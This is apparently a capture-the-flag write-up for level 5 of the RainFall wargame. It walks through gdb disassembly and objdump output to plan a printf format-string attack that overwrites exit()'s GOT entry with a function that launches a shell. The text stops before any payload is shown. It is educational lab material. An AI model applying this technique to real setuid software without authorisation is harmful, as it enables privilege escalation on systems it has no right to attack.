# Level 5

## Vulnerability

Global Offset Table Exploit + printf string vulnerability

## Context

```
level5@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
level5@RainFall:~$ ./level5
hello
hello
```
We have a binary that prints input from the stdin.

## Solution

Let's take a look at the binary in gdb. <br/>
We can see here that ```level5``` makes a call to ```main()```, which makes a call to a function ```n()```. <br/>
There is also a function ```o()``` which is not called. 
```
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
```
Let's take a deeper look a ```n()```. <br/>
We can see two function calls in ```n()```. <br/>
One is to ```fgets()```, which is protected against buffer overflow attacks. <br/>
The other is to ```printf()```, which is vulnerable to string format exploits. <br/>
The function then calls ```exit()```.
```
(gdb) disas n
Dump of assembler code for function n:
[...]
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
[...]
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
[...]
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```
In ```o()```, we can see a call to ```system()```, which launches a new shell. 
```
(gdb) disas o
Dump of assembler code for function o:
[...]
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
```
Why are all these functions ```@plt```? <br/>
~ A little background: ~ <br/>
A ```PLT``` (or Procedure Linkage Table) is a special section in compiled programs which consists of many jump instructions to external functions / shared libraries (for example, libc functions). These jump instructions jump to the ```GOT``` (or Global Offset Table), which contains the actual function address. <br/>
The PLT is read-only but the GOT can be written to. <br/>
The execution flow of the program can be controlled by overwriting one of the GOT's function addresses. <br/>
So... what's the plan? <br/>
We can leverage ```printf``` in a format string attack to replace the address of ```exit()``` with the address of ```o()```, which will then call ```system``` to launch a new shell. <br/> <br/> 

Let's locate the addresses of ```exit()``` and ```o()```. <br/> 
```
(gdb) info functions
All defined functions:

[...]
0x080483d0  exit@plt
0x080484a4  o
```
Unfortunately, the real address of ```exit()``` is in the GOT. Let's looks there. 
```
level5@RainFall:~$ objdump -R level5 | grep exit
08049838 R_386_JUMP_SLOT   exit
```
So the address of ```exit()``` is 0x08049838, and the address of ```o()``` is 0x080484a4.
